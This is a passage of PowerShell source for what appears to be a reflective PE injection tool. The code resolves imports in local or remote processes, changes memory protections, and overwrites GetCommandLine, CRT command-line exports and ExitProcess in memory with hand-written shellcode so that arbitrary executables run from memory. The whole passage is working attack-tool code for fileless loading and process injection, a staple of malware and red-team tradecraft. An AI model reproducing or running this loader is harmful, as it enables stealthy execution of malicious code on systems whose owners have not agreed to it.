		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}
				
				#Get the first thunk, then loop through all of them
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					#	and doing the comparison, just see if it is less than 0
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
					}
					else
					{
				        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
						    Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}

		#################################################
		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
		}

		#Prepare the shellcode
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		#Make copy of GetCommandLineA and GetCommandLineW
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		#Overwrite GetCommandLineA
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		#Overwrite GetCommandLineW
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		#################################################
		
		
		#################################################
		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		#################################################
		
		
		#################################################
		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		$ReturnArray = @()
		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		#CorExitProcess (compiled in to visual studio c++)
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr
		
		#ExitProcess (what non-managed programs use)
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			#The following is the shellcode (Shellcode: ExitThread.asm):
			#32bit shellcode
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			#64bit shellcode (Shellcode: ExitThread.asm)
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			#Make copy of original ExitProcess bytes
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
			#	call ExitThread
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		#################################################

		Write-Output $ReturnArray
	}
	
	
	#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	#	It copies Count bytes from Source to Destination.
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	#####################################
	##########    FUNCTIONS   ###########
	#####################################
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Get the export table
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			#AddressOfNames is an array of pointers to strings of the names of the functions exported
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				#    which contains the offset of the function in to the DLL
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
        #ASLR check
		[IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not $ForceASLR) -and (-not $PESupportsASLR))
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
